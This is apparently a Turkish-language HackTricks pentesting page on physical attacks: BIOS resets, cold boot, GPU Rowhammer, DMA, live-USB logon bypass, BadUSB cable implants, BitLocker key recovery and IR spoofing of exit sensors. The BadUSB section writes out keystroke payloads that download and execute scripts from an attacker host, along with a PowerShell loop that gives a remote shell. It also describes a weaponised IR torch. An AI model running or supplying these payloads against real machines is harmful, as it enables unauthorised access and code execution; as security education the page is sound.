# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilinin çıkarılması veya belgelenmiş bir clear-CMOS jumper'ının kullanılmasıyla sıfırlanabilir. Gerekli güç kesme süresi anakarta özeldir ve modern UEFI parolaları veya anahtarları, uçucu olmayan flash bellekte, bir embedded controller'da ya da bir güvenlik cihazında tutulabilir; bu nedenle pilin çıkarılmasından sonra da kalabilir. Pinleri kısa devre yapmadan önce anakart/servis kılavuzuna başvurun; bu prosedür TPM ölçümlerini geçersiz kılabilir ve disk şifreleme kurtarma sürecini tetikleyebilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, boot edilebilir bir ortamdan CMOS ile desteklenen ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS aileleri kümesindeki parola formatlarını tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış derlemeleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu araçlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı laptop firmware'leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir challenge code görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir challenge olmadan lockout uygular. Oluşturulan herhangi bir parolayı modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerde CHIPSEC, Secure Boot değişkeni korumalarını denetleyebilir. Aşağıdaki değişiklik yapmayan kontrolle başlayın; isteğe bağlı `-a modify` modu, değişkenleri kasıtlı olarak bozmaya çalışır ve yalnızca kurtarılabilir bir lab sistemi üzerinde kullanılmalıdır. CHIPSEC'in kendisi, ayrıcalıklı driver'ının ve düşük seviyeli donanım erişiminin production endpoint'leri için uygun olmadığı konusunda uyarır.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analizi ve Cold Boot Saldırıları

DRAM, yenileme durduğunda her biti anında kaybetmez. Bozulma hızı, modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verilerin soğutulmamış bir güç döngüsünden çok daha uzun süre korunmasını sağlayabilir. Bir cold-boot saldırısı, küçük bir acquisition ortamına hızlıca yeniden başlatır veya soğutulmuş bir modülü aktarır, ham belleği yakalar ve bit bozulmasına rağmen kriptografik anahtarları yeniden oluşturur. Bir disk-copy utility otomatik olarak physical-memory imager değildir ve Volatility, acquisition işlemini gerçekleştirmek yerine capture edilen veriyi analiz eder; platforma uygun, doğrulanmış bir acquisition tool kullanın.<sup>[[12]](#references)</sup>

---

## Page Table'lara Karşı GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU virtual-memory metadata**'sını hedeflediğinde çok daha kullanışlı hâle gelir. **GDDR6 NVIDIA Ampere GPU**'lar üzerine yapılan güncel çalışmalar, unprivileged CUDA code çalıştıran bir saldırganın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging structure'ları güvenlik açığı bulunan satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya bir intermediate **page directory** içindeki bitleri değiştirebildiğini gösteriyor. Tek bir translation entry bozulduğunda saldırgan **arbitrary GPU memory read/write** yeteneğini elde edebilir ve ardından host compromise'a pivot edebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6'da **hammerable row**'ları profilleyin ve DRAM içi mitigations'ı aşan, refresh-aware / non-uniform hammering pattern'leri oluşturun.
2. Driver'ın page-translation structure'larını varsayılan protected pool'da tutmak yerine hammerable physical location'lara yerleştirmesi için **GPU allocation**'larını massage edin. Uygulamada bu, low-memory page-table region'ını tüketmeyi ve kontrollü stride'larla büyük, sparse UVM mapping'leri spray etmeyi içerebilir.
3. Saldırganın kontrolündeki virtual page'in page-table page'lerine, arbitrary GPU memory'ye veya host-visible system mapping'lerine çözülmesini sağlamak için page-table / page-directory entry içindeki **PFN** veya aperture ile ilgili bitler gibi **translation metadata**'ları değiştirin.
4. Forged mapping'i yeniden kullanarak ek translation entry'lerini yeniden yazın ve GPU context'leri arasında **arbitrary GPU memory read/write** yeteneğine yükselin.

### Host Pivot ve Mitigations

- **IOMMU disabled** olduğunda forged system-aperture mapping'leri arbitrary **host physical memory**'yi GPU'ya açığa çıkarabilir ve GPU primitive'ini full host compromise'a dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**, last-level page-table entry'lerini hedeflerken **GeForge**, bir page-directory level'ını bozmanın daha kolay olabileceğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'yi yeniden hedefleyebilir. Yalnızca tek bir paging layer'ını security-critical kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory yolunu engellediği için hâlâ önemlidir; ancak **complete mitigation** değildir. **GPUBreach**, saldırganın GPU-writable, driver-owned CPU buffer'larını bozduğu ve ardından NVIDIA driver memory-safety bug'larını tetikleyerek kernel write primitive ve **root shell** elde ettiği ikinci aşama bir pivot gösterir; bu, IOMMU enabled durumdayken bile mümkündür.<sup>[[3]](#references)</sup>
- Desteklenen workstation/server GPU'larında **system-level ECC** pratik bir hardening adımıdır. ECC bulunmayan consumer GPU'lar daha zayıf bir defense surface sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar tamamen teorik değildir: **GeForge**, bir RTX 3060 üzerinde **1,171**, bir RTX A6000 üzerinde ise **202** bit flip bildirmiştir; bu sayılar çalışan bir host-privilege-escalation chain oluşturmak için yeterli olmuştur.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Saldırıları

**Inception**, FireWire ve ilk Thunderbolt yapılandırmaları gibi interface'ler üzerinden **DMA-based memory acquisition and patching** işlemini ve historical login-bypass signature'larını gösterir. Bu yöntem yalnızca “Windows 10'a karşı etkisiz” değildir: exploitability; interface'e, target build'e, IOMMU policy'ye, lock state'e ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilmiş olup olmamasına bağlıdır. Windows 10 version 1803 ve sonraki sürümler, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sunarak attack surface'i önemli ölçüde değiştirmiştir.<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access için Live CD/USB

Şifrelenmemiş veya zaten unlock edilmiş bir Windows volume üzerinde offline environment, **sethc.exe** veya **Utilman.exe** gibi accessibility binary'lerini **cmd.exe** ile değiştirebilir; ilgili logon-screen shortcut çalıştırıldığında SYSTEM command prompt elde edilir. **chntpw** gibi tools, local SAM account data'yı düzenleyebilir. Bu yöntemler locked BitLocker volume'u bypass etmez ve DPAPI/EFS tarafından korunan credential'lara zarar verebilir; forensic copy'leri ve backup'ları koruyun.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için commercial boot-time authentication-bypass tool'dur. Compatibility; OS, firmware mode, Secure Boot ve disk-encryption setup'a bağlıdır; BitLocker-locked volume'un şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Security Features ile Çalışma

### Boot ve Recovery Shortcut'ları

- **Delete/Supr**, F2, F10 veya başka bir vendor key firmware setup'ı açabilir.
- **F8**, yalnızca bu yolun etkin kalmaya devam ettiği yapılandırmalarda legacy Windows advanced boot options'a girer; güncel recovery entry yöntemi değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows automatic logon'u engelleyebilir; ancak policy/registry settings bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** ve Teensy board'ları gibi devices, trusted HID keyboard olarak enumerate olabilir ve predefined keystroke'lar inject edebilir. Payload başlangıçta logged-on session'ın privilege'larına ve desktop access'ine sahiptir; UAC prompt'ları, screen locking, keyboard layout, timing ve endpoint USB policy yine de payload'ı sınırlar.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator veya backup privilege'ları, locked file'ların (örneğin **SAM** ve **SYSTEM**) acquire edilebilmesi için shadow copy oluşturabilir veya registry hive'larını kaydedebilir. Bu, post-compromise collection technique'tir; privilege bypass değildir ve `diskshadow`/VSS ile registry-hive export event'leriyle ilişkilendirilmelidir.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implants, USB-A→USB-C veya USB-C↔USB-C cable'ların içine gizlenir, yalnızca USB keyboard olarak enumerate olur ve C2 stack'ini Wi-Fi üzerinden sunar. Operator'ün yapması gereken tek şey cable'a victim host üzerinden güç vermek, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir hotspot oluşturmak ve embedded HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) adresine (veya DHCP address'ine) gitmektir.<sup>[[8]](#references)</sup>
- Browser UI; *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmelerini sağlar. Stored payload'lar OS başına tag'lenir, keyboard layout'ları anında değiştirilir ve VID/PID string'leri bilinen peripheral'ları taklit edecek şekilde değiştirilebilir.
- C2 cable'ın içinde bulunduğundan phone, payload'ları stage edebilir, execution'ı trigger edebilir ve Wi-Fi credential'larını organization's network'ünü kullanmadan yönetebilir; bu, kısa dwell-time gerektiren physical intrusion'lar için kullanışlıdır.

### OS-aware AutoExec payloads

- AutoExec rule'ları, USB enumeration'dan hemen sonra çalıştırılmak üzere bir veya daha fazla payload'ı bağlar. Implant, lightweight OS fingerprinting gerçekleştirir ve eşleşen script'i seçer.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution unattended olduğundan, yalnızca bir charging cable'ı değiştirmek logged-on user context altında “plug-and-pwn” initial access elde etmek için yeterli olabilir.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Stored payload bir console açar ve yeni USB serial device'a gelen her şeyi çalıştıran bir loop'u paste eder. Minimal bir Windows variant'ı şöyledir:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3, operatöre geri bağlanan bir TCP client (Python script, Android APK veya masaüstü executable) başlatır. TCP oturumuna yazılan tüm byte'lar yukarıdaki serial kanalına iletilir; böylece air-gapped host'larda bile remote command execution elde edilir. Çıktı sınırlıdır, bu nedenle operatörler genellikle blind command'ler (account creation, ek tooling hazırlama vb.) çalıştırır.

### HTTP OTA update surface

- Belgelenen Evil Crow Cable Wind arayüzü, `/update` adresinde unauthenticated bir firmware-update endpoint'i sunar:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators, engagement sırasında kabloyu açmadan özellikleri (ör. flash USB Army Knife firmware'i) hot-swap ile değiştirebilir; böylece implant hedef host'a hâlâ bağlıyken yeni yeteneklere geçiş yapabilir.

## BitLocker Şifrelemesini Atlama

Canlı veya kısa süre önce çalıştırılmış bir sistemin yetkili adli edinimi, volume kilidi açılmış durumdayken bir BitLocker volume master key'i veya ilişkili anahtar materyali içerebilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarında, hibernation dosyalarında veya crash dump'larında arama yapabilir; ancak başarı garanti değildir. BitLocker etkinleştirildiğinde modern Windows, crash dump'larını da şifreler ve kayıtlı 48 haneli recovery password, bellekteki volume key'den farklı bir artefact'tır.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key Eklemek İçin Social Engineering

Bir saldırgan, bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir recovery-password, external-key veya başka bir protector ekleyebilir ve ardından bunu ele geçirebilir. Bir recovery password, sıfırlardan oluşan rastgele bir dize olamaz: BitLocker sayısal recovery password'ları doğrulanmış 48 haneli bir biçime sahiptir. İlgili yetkili yönetim sözdizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; ortaya çıkan protector'ları `manage-bde -protectors -get C:` ile listeleyin. Protector eklemelerini izleyin ve yeni recovery materyalinin yalnızca onaylanmış konumlara escrow edilmesini sağlayın.<sup>[[16]](#references)</sup>

---

## BIOS'u Factory-Reset Etmek İçin Chassis Intrusion / Maintenance Switch'lerini Exploit Etme

Birçok modern laptop ve small-form-factor desktop, Embedded Controller (EC) ile BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** içerir. Switch'in temel amacı bir cihaz açıldığında uyarı vermek olsa da üreticiler bazen switch belirli bir düzende değiştirildiğinde tetiklenen **belgelenmemiş bir recovery shortcut** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack Nasıl Çalışır

1. Switch, EC üzerindeki bir **GPIO interrupt** hattına bağlanmıştır.
2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
3. Hard-coded bir pattern tanındığında EC, **system NVRAM/CMOS içeriğini silen** bir *mainboard-reset* routine'i çağırır.
4. Bir sonraki boot işleminde etkilenen modeller resetlenmiş firmware durumunu yükler. Üreticiye ve revision'a bağlı olarak silinen durum; supervisor password'ünü, özel boot ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir; TPM durumu ve disk-şifreleme etkileri ayrıca değerlendirilmelidir.

> Bir firmware reset, external-boot seçeneklerini geri getirebilir; ancak storage'ın şifresini çözmez. BitLocker veya başka bir full-disk encryption sistemi, TPM/firmware değişikliklerinden sonra recovery moduna geçebilir ve recovery key olmadan internal drive'ı korumaya devam edebilir.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) için recovery shortcut şu şekildedir:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Onuncu döngünün ardından EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini bildiren bir flag ayarlar. Tüm prosedür yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalışmasını sağlamak için hedefi açın veya askıya alıp devam ettirin.
2. İzinsiz giriş/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü toggle pattern'i tekrarlayın (dokümantasyona ve forumlara başvurun veya EC firmware'ini reverse-engineer edin).
4. Cihazı yeniden monte edip reboot edin, ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici boot kullanılabiliyorsa, kontrollü bir live image ile boot edin. Dahili bir volume meşru biçimde unlock edildikten sonra (veya hiç encrypted değilse), live environment kimlik bilgilerini ve verileri elde edebilir veya EFI System Partition'ı inceleyebilir. Bu partition'ı bir EFI implant kurmak için değiştirmek kalıcı ve son derece intrusive bir işlemdir; ayrıca Secure Boot, measured boot, firmware write protection ve endpoint monitoring tarafından sınırlandırılmaya devam eder. Encrypted storage, anahtarı veya recovery material'ı olmadan erişilemez durumdadır.

### Detection & Mitigation

* OS management console'da chassis-intrusion event'lerini loglayın ve bunları beklenmeyen BIOS reset'leriyle ilişkilendirin.
* Açılmayı tespit etmek için vidalar/kapaklar üzerinde **tamper-evident seal'ler** kullanın.
* Cihazları **fiziksel olarak kontrol edilen alanlarda** tutun; fiziksel erişimin full compromise anlamına geldiğini varsayın.
* Kullanılabildiği durumlarda, üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM reset'leri için ek bir cryptographic authorisation gerektirin.

---

## No-Touch Exit Sensor'larına Karşı Covert IR Injection

### Sensor Özellikleri
- Commodity “wave-to-exit” sensor'ları, near-IR LED emitter'ı TV kumandası tarzı bir receiver module'üyle eşleştirir ve yalnızca doğru carrier'ın birden fazla pulse'unu (yaklaşık 4–10) gördükten sonra logic high bildirir (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastik bir shroud, emitter ve receiver'ın doğrudan birbirine bakmasını engeller; böylece controller, doğrulanmış herhangi bir carrier'ın yakındaki bir yansımadan geldiğini varsayar ve door strike'ı açan bir relay'i sürer.
- Controller bir target'ın mevcut olduğuna inandığında outbound modulation envelope'u genellikle değişir, ancak receiver filtrelenmiş carrier ile eşleşen herhangi bir burst'ü kabul etmeye devam eder.

### Attack Workflow
1. **Emission profile'ı capture edin** – internal IR LED'i süren hem detection öncesi hem de detection sonrası waveform'ları kaydetmek için controller pin'lerine bir logic analyser bağlayın.
2. **Yalnızca “post-detection” waveform'unu replay edin** – stock emitter'ı çıkarın veya yok sayın ve harici bir IR LED'i başlangıçtan itibaren zaten tetiklenmiş pattern ile sürün. Receiver yalnızca pulse count/frequency ile ilgilendiğinden, spoofed carrier'ı gerçek bir yansıma olarak kabul eder ve relay line'ı aktif duruma getirir.
3. **Transmission'ı gate edin** – receiver'ın AGC'sini veya interference handling logic'ini saturate etmeden minimum pulse count'u iletmek için carrier'ı ayarlanmış burst'ler halinde gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Continuous emission, sensor'ı hızla desensitise eder ve relay'in çalışmasını durdurur.

### Long-Range Reflective Injection
- Bench LED'ini high-power IR diode, MOSFET driver ve focusing optics ile değiştirmek, yaklaşık 6 m mesafeden güvenilir triggering sağlar.
- Attacker'ın receiver aperture'una line-of-sight erişimine ihtiyacı yoktur; beam'i camdan görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30° field of view içine girmesini sağlar ve yakın mesafedeki bir el wave'ini taklit eder.
- Receiver'lar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici beam birden fazla yüzeyden bounce ederek detection threshold'un üzerinde kalabilir.

### Weaponised Attack Torch
- Driver'ı ticari bir flashlight'ın içine gömmek, aracı göz önünde saklar. Görünür LED'i receiver band'ına uygun high-power IR LED ile değiştirin, ≈30 kHz burst'ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED current'ını sink etmek için bir MOSFET kullanın.
- Telescopic zoom lens, range/precision için beam'i daraltırken MCU control altındaki bir vibration motor, görünür ışık yaymadan modulation'ın aktif olduğuna dair haptic confirmation sağlar.
- Birkaç stored modulation pattern arasında cycling yapmak (biraz farklı carrier frequency'leri ve envelope'lar), rebranded sensor family'leri arasındaki compatibility'yi artırır; bu da operator'ın relay'in sesli biçimde click etmesini ve kapının açılmasını sağlayana kadar reflective surface'leri sweep etmesine olanak tanır.

---

## References

- [1] [GDDRHammer: Modern GPU'lardan Cross-Component Rowhammer Attacks ile DRAM Rows'u Greatly Disturbing](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Fun and Profit için GDDR Memory'yi Hammering ile GPU Page Tables Forge Etme](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch ile IR No-Touch Exit Sensor'larını Bypass Etme”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips'e Karşı Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keys'e Karşı Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
